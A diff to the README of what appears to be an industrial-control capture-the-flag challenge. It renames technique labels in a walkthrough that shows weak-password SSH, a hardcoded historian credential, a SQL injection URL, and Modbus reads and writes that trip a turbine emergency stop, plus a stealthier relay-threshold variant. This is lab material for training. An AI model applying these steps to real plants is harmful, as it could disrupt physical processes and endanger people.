@@ -3,7 +3,7 @@
 Three-zone attack chain from jump-host entry to turbine emergency stop. Covers initial
 access, credential exfiltration, lateral movement, process recon, and state manipulation.
 
-- Techniques in order: 8, 3, 10, 2, 1
+- Techniques in order: trust exploitation, data exfiltration, lateral movement, process intelligence, state manipulation
 - Challenge type: Realist
 - Difficulty: Advanced
 
@@ -29,7 +29,7 @@ For Hetzner deployment, run `bash infrastructure/jump-host/setup.sh` first, then
 
 ## Attack path
 
-### Stage 1: enterprise recon (technique 8)
+### Stage 1: enterprise recon (trust exploitation)
 
 ```bash
 # On jump-host
@@ -57,7 +57,7 @@ cat network-inventory.txt
 # Lists operational zone IPs: 10.10.2.10 (historian), 10.10.2.20 (scada), 10.10.2.30 (eng-ws)
 ```
 
-### Stage 2: enterprise workstation pivot (techniques 8, 3)
+### Stage 2: enterprise workstation pivot (trust exploitation, data exfiltration)
 
 ```bash
 # SSH to enterprise workstation with weak password
@@ -76,7 +76,7 @@ cat ~/pull_monthly_report.sh
 # Hardcoded: hist_admin:Historian2015
 ```
 
-### Stage 3: historian exfiltration (technique 3)
+### Stage 3: historian exfiltration (data exfiltration)
 
 ```bash
 # From enterprise workstation (10.10.2.100 has operational zone access)
@@ -90,7 +90,7 @@ curl "http://10.10.2.10:8080/report?asset=turbine'+UNION+SELECT+asset,threshold_
 # relay_a_uv   | undervoltage | 195
 ```
 
-### Stage 4: engineering workstation and control zone access (technique 10)
+### Stage 4: engineering workstation and control zone access (lateral movement)
 
 ```bash
 # SSH to engineering workstation (dual-homed: 10.10.2.30 / 10.10.3.100)
@@ -109,14 +109,14 @@ python3 modbus_read.py 10.10.3.21 502 holding 0 10
 # HR[0]=1500 (RPM setpoint), HR[1]=45 (fuel valve%), HR[2]=0 (trip=False), HR[3]=150 (OC threshold)
 ```
 
-### Stage 5: turbine trip (techniques 2, 1)
+### Stage 5: turbine trip (process intelligence, state manipulation)
 
 ```bash
-# Confirm live turbine state (technique 2)
+# Confirm live turbine state (process intelligence)
 python3 modbus_read.py 10.10.3.21 502 coil 0 1
 # [False]: estop not active
 
-# Emergency stop (technique 1)
+# Emergency stop (state manipulation)
 python3 modbus_write.py 10.10.3.21 502 coil 0 1
 # Write accepted
 
@@ -147,6 +147,7 @@ component is the last 30 seconds of a multi-hour operation. The [ICS-CERT adviso
 ## Same chain, different endpoint
 
 Replace the turbine estop with IED relay threshold manipulation (`HR[2] = 0` via relay
-Modbus, technique 6): the relay trips spuriously on any load, not on demand. The participant
-reaches the same point in the network but the impact is subtler and harder to detect. That
-variant sits at the same difficulty but uses technique 6 instead of technique 1.
+Modbus, control logic manipulation): the relay trips spuriously on any load, not on demand.
+The participant reaches the same point in the network but the impact is subtler and harder to
+detect. That variant sits at the same difficulty but uses control logic manipulation instead
+of state manipulation.
